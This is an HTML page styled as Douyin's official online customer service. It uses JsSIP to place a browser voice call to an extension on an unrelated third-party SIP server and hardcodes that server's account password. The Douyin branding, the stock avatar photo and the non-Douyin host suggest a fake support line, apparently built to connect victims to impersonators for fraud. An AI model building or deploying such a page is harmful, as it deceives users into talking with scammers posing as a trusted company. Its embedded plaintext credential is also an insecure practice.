<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>抖音在线客服</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f9f9f9;
      text-align: center;
    }

    .logo-box img {
      width: 100px;
      height: 100px;
      margin-bottom: 20px;
    }

    .main-content {
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      margin: 0 auto;
    }

    .profile-avatar {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      margin: 10px 0;
    }

    button {
      padding: 15px 30px;
      margin: 10px;
      border: none;
      background-color: #ff7214;
      color: white;
      font-size: 18px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    button:disabled {
      background-color: #cccccc;
    }

    button:hover {
      background-color: #ff5400;
    }

    #callStatus {
      font-size: 20px;
      margin-top: 20px;
      font-weight: bold;
    }

    #audioRemote {
      display: none;
    }
  </style>
</head>
<body>
  <div class="logo-box">
    <img src="https://img.alicdn.com/imgextra/i4/O1CN01dnivBF1N5RSFx2Jfa_!!6000000001533-2-tps-200-200.png" alt="抖音LOGO" />
  </div>

  <div class="main-content">
    <h1>抖音在线客服</h1>
    <img class="profile-avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="客服头像" />
    <button id="callButton">📞 呼叫客服</button>
    <button id="hangupButton" disabled>🛑 挂断</button>
    <div id="callStatus">未呼叫</div>
    <audio id="audioRemote" autoplay loop>
      <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3" />
    </audio>
  </div>

  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const callBtn = document.getElementById('callButton');
      const hangBtn = document.getElementById('hangupButton');
      const statusDisplay = document.getElementById('callStatus');
      const remoteAudio = document.getElementById('audioRemote');

      let isCalling = false; // 标记当前是否在通话中

      function updateStatus(text) {
        statusDisplay.textContent = text;
      }

      // 按钮事件监听
      callBtn.addEventListener('click', makeCall);
      hangBtn.addEventListener('click', hangupCall);

      // WebSocket连接设置
      const socket = new JsSIP.WebSocketInterface('wss://123.xin.anjre.cn:8089/ws'); // 使用正确的WebSocket地址
      const configuration = {
        sockets: [socket],
        uri: 'sip:1001@123.xin.anjre.cn', // SIP账号
        password: 'Aa6363463@',           // SIP密码
        display_name: '抖音网页客户',
        session_timers: false,
        register: true
      };

      const ua = new JsSIP.UA(configuration);
      let session = null;

      // 注册SIP UA
      ua.start();
      ua.on('registered', () => console.log('✅ 注册成功'));
      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
      ua.on('disconnected', () => console.warn('SIP WebSocket 断开'));

      // 监听RTC会话
      ua.on('newRTCSession', e => {
        session = e.session;
        session.connection.addEventListener('addstream', evt => {
          remoteAudio.srcObject = evt.stream;
          remoteAudio.play().catch(console.warn);
        });
      });

      // 拨打电话
      async function makeCall() {
        if (isCalling) return; // 如果已经在呼叫中，阻止再次点击
        try {
          await navigator.mediaDevices.getUserMedia({ audio: true, video: false }); // 请求麦克风权限
        } catch (err) {
          alert('请允许使用麦克风');
          return;
        }

        isCalling = true; // 设置为正在呼叫中
        callBtn.disabled = true; // 禁用呼叫按钮
        hangBtn.disabled = false; // 启用挂断按钮
        updateStatus("正在拨号...");

        session = ua.call('sip:8001@123.xin.anjre.cn', {
          mediaConstraints: { audio: true, video: false },
          rtcOfferConstraints: { offerToReceiveAudio: 1, offerToReceiveVideo: 0 }
        });

        session.on('progress', () => {
          updateStatus("振铃中...");
          remoteAudio.play(); // 播放振铃音
        });

        session.on('accepted', () => {
          updateStatus("通话中");
          remoteAudio.pause(); // 停止播放铃声
        });

        session.on('ended', resetUI);
        session.on('failed', e => { updateStatus("通话失败"); console.error(e); resetUI(); });
      }

      // 挂断电话
      function hangupCall() {
        if (session) session.terminate();
        resetUI();
      }

      // 重置UI状态
      function resetUI() {
        isCalling = false; // 设置为未呼叫
        callBtn.disabled = false; // 启用呼叫按钮
        hangBtn.disabled = true; // 禁用挂断按钮
        updateStatus("未呼叫");
        remoteAudio.pause(); // 停止播放音频
        session = null;
      }

      // 页面切换前台时提醒
      document.addEventListener('visibilitychange', () => {
        if (document.hidden) alert("请保持页面前台以确保通话顺畅");
      });
    });
  </script>
</body>
</html>
